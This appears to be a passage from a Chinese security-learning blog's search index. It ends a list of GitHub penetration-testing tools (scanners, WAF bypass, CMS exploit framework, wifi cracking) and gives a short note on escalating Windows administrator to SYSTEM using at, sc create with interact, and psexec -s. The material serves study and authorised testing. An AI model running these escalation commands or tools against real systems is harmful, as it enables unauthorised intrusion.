Bruteforcer）</p><p><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (A small python script to check for Cross-Site Tracing)</p><p><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</p><p><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描xss的python脚本）</p><p>企业网络自检</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> （详细的内部网络信息扫描器）</p><p><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> (javascript实现的本地网络扫描器)</p><p><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</p><p><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a> (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</p><p>webshell检测</p><p><a href="https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/</a> （php后门检测，脚本较简单，因此存在误报高和效率低下的问题）</p><p><a href="https://github.com/yassineaddi/BackdoorMan" target="_blank" rel="noopener">https://github.com/yassineaddi/BackdoorMan</a> （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）</p><p>内网渗透</p><p><a href="https://github.com/0xwindows/VulScritp" target="_blank" rel="noopener">https://github.com/0xwindows/VulScritp</a> （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）</p><p><a href="https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）</a></p><p><a href="https://github.com/fdiskyou/hunter（调用" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter（调用</a> Windows API 枚举用户登录信息）</p><p>中间件扫描、指纹识别类</p><p><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （ssl类型识别)</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (web指纹识别)</p><p><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (web应用指纹识别)</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</p><p><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (a fast Network scanner inspired by Masscan and Zmap)</p><p><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</p><p><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (Web path scanner)</p><p><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</p><p><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</p><p><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</p><p><a href="https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）" target="_blank" rel="noopener">https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）</a></p><p><a href="https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）" target="_blank" rel="noopener">https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</a></p><p><a href="https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）</a></p><p><a href="https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）" target="_blank" rel="noopener">https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）</a></p><p><a href="https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）" target="_blank" rel="noopener">https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）</a></p><p>专用扫描器</p><p><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (discuz扫描)</p><p><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (CMS攻击框架)</p><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> (an IIS shortname Scanner)</p><p><a href="https://github.com/We5ter/Scanne" target="_blank" rel="noopener">https://github.com/We5ter/Scanne</a> … ter/FlashScanner.pl (flashxss扫描)</p><p><a href="https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）</a></p><p>无线网络</p><p><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</p><p><a href="https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）</a></p><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）</a></p><p>综合类</p><p><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</p><p><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)</p><p><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</p><p><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （被动式漏洞扫描)</p><p><a href="https://github.com/alpha1e0/pentestdb" target="_blank" rel="noopener">https://github.com/alpha1e0/pentestdb</a> (WEB渗透测试数据库)</p><p><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</p><p><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</p><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</p><p><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （3xp10it自动化渗透测试框架）</p><p><a href="https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）</a></p><p><a href="https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）</a></p><h3 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h3><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></p><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a></p><p><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">http://ctf.bugku.com/</a></p><p><a href="http://rookiehacker.org/" target="_blank" rel="noopener">http://rookiehacker.org/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>admin提权为system</title>
      <link href="/2019/04/12/admin-ti-quan-wei-system/"/>
      <url>/2019/04/12/admin-ti-quan-wei-system/</url>
      
        <content type="html"><![CDATA[<p><code>windows</code>底下设置密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user username *</span><br></pre></td></tr></table></figure><p>提醒输入密码，确认密码</p><p><code>net user</code>查看当前系统下面的用户账号 <code>XP</code>底下是<code>HelpAssistant</code>是远程协助的账号</p><p><code>net user username</code>查看当前系统这个账号的基本信息</p><p>属于那个组，属于管理员组，具有百分之九十九的账号权限。</p><p>从管理员提权到<code>SYSTEM</code></p><p>使用<code>at</code>命令 指定一个时间使得在某一个时间执行一个特定的任务， <code>at 18:30 /interactive</code> <code>cmd</code>执行完成后就会获取一个<code>SYSTEM</code>的<code>CMD</code>的权限。 可以使用<code>whoami</code>命令查看一个是什么权限，但是whoami是旨在服务器端运行的程序<br>接下来使用<code>system</code>权限杀掉掉<code>explor</code>桌面进程，在打开是不是就整个桌面的环境都是<code>SYSTEM</code>权限</p><p><code>cmd</code>下输入<code>taskmgr</code>，进入任务管理器，结束进程 ，在新建一个任务就会打开<code>explor</code>进程。现在打开的全部都是<code>system</code>权限</p><p>注意：这种方式<code>windows xp</code>,<code>2003</code>使用，到了<code>windows 8</code> <code>windows7</code> <code>At</code>命令就被删除了。</p><p><code>windows7</code>使用<code>sc</code>命令</p><p>使用<code>sc</code>可以创建一条系统的服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interact</span><br></pre></td></tr></table></figure><p><code>interact</code>是交互式的 <code>syscmd</code> 是自己取的名字，<code>cmd /K start</code>是使用的重新打开一个<code>cmd</code>命令窗口。</p><p><code>services.msc</code>打开系统的服务</p><p><code>cmd</code>输入 <code>sc syscmd start</code>启动了<code>system</code>权限的<code>cmd</code>窗口 - 使用第三方的套件 下载之后，<code>psexec</code>提权</p><p><code>- -I</code> 交互式运行程序<br><code>-s</code> 把自己提升为一个<code>system</code>权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
